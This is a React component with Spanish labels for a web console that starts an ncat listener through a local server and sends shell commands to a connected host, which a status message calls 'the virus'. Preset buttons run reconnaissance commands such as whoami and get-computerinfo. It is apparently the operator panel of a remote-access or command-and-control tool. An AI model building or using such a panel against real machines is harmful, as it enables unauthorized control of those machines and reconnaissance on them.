import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { useNavigate, useParams } from 'react-router-dom';
import './CmdWindow.css';

function CmdWindow() {
  const { port } = useParams(); // Obtener el puerto de la URL
  const [inputCommand, setInputCommand] = useState('');
  const [commandHistory, setCommandHistory] = useState([]);
  const [isNcatConnected, setIsNcatConnected] = useState(false);
  const socketRef = useRef(null);
  const navigate = useNavigate();
  const commandHistoryRef = useRef(null);

  useEffect(() => {
    socketRef.current = new WebSocket('ws://localhost:5000');

    socketRef.current.onopen = () => {
      console.log('WebSocket connected');
    };

    socketRef.current.onmessage = (event) => {
      const data = event.data;
      setCommandHistory((prev) => [...prev, data]);
    };

    socketRef.current.onclose = () => {
      setIsNcatConnected(false);
      setCommandHistory((prev) => [...prev, 'Error: Se desconectó el virus.']);
    };

    const startNcat = async () => {
      try {
        await axios.get(`http://localhost:5000/cmd/${port}`); // Usar el puerto de la URL
        setIsNcatConnected(true);
      } catch (error) {
        console.error('Error starting ncat:', error);
      }
    };

    startNcat();

    return () => {
      socketRef.current.close();
    };
  }, [port]);

  const handleInputChange = (event) => {
    setInputCommand(event.target.value);
  };

  const handleKeyPress = async (event) => {
    if (event.key === 'Enter') {
      await executeCommand(inputCommand.trim());
    }
  };

  const handleBackClick = () => {
    navigate('/estado');
  };

  const executeCommand = async (command) => {
    if (!command) return;

    setCommandHistory((prev) => [...prev, `> ${command}`]);
    setInputCommand('');

    try {
      await axios.post('http://localhost:5000/send-command', { command });
    } catch (error) {
      const errorMessage = error.response?.data?.message || 'Error al enviar el comando.';
      setCommandHistory((prev) => [...prev, errorMessage]);
    }
  };

  const handleButtonClick = (command) => {
    executeCommand(command);
  };

  useEffect(() => {
    if (commandHistoryRef.current) {
      commandHistoryRef.current.scrollTop = commandHistoryRef.current.scrollHeight;
    }
  }, [commandHistory]);

  return (
    <div className="cmd-container">
      <div className="sidebar">
        <button className="back-button" onClick={handleBackClick}>
          Regresar a Ver Estado
        </button>
        <div className="command-buttons">
          <button className="command-button" onClick={() => handleButtonClick('whoami')}>whoami</button>
          <button className="command-button" onClick={() => handleButtonClick('get-service')}>get-service</button>
          <button className="command-button" onClick={() => handleButtonClick('get-process')}>get-process</button>
          <button className="command-button" onClick={() => handleButtonClick('get-computerinfo')}>get-computerinfo</button>
        </div>
      </div>
      <div className="cmd-window" ref={commandHistoryRef}>
        <pre className="command-history">
          {commandHistory.map((cmd, index) => (
            <div key={index} className={cmd.startsWith('>') ? 'user-command' : 'server-response'}>
              {cmd}
            </div>
          ))}
          {isNcatConnected && (
            <input
              type="text"
              value={inputCommand}
              onChange={handleInputChange}
              onKeyPress={handleKeyPress}
              className="cmd-input"
              placeholder="Ingrese un comando..."
            />
          )}
        </pre>
      </div>
    </div>
  );
}

export default CmdWindow;
